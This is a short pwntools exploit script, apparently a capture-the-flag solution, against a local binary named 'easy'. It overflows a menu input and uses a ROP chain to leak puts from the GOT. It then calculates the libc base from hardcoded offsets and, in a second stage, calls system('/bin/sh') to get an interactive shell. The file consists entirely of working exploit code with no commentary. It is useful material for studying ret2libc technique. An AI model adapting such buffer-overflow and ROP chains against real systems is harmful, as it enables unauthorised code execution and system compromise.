from pwn import *

p = process(["./easy"])

binary = ELF("./easy")
pop1rdi = 0x0000000000400be3      # : pop rdi; ret;
main = 0x400add

p.sendlineafter("> ", "1")
p.sendafter("> ", "A" * 0x20)
p.sendlineafter("> ", "3")
p.sendafter("> ", "A" * 0x40)
p.sendlineafter("> ", str(0x1337))
p.sendafter("> ", "A" * 0x10 + "B" * 8 + p64(pop1rdi) + p64(binary.got["puts"]) + p64(binary.plt["puts"]) + p64(main))
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 0x6f690
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57
log.info("leak : " + hex(leak))
log.info("libc_base : " + hex(libc_base))


#### stage 2 -> do rop ####

p.sendlineafter("> ", "3")
p.sendafter("> ", "A" * 0x40)
p.sendlineafter("> ", str(0x1337))
p.sendafter("> ", "A" * 0x10 + "B" * 8 + p64(pop1rdi) + p64(binsh) + p64(system) + p64(0xdeadbeef))
p.interactive()
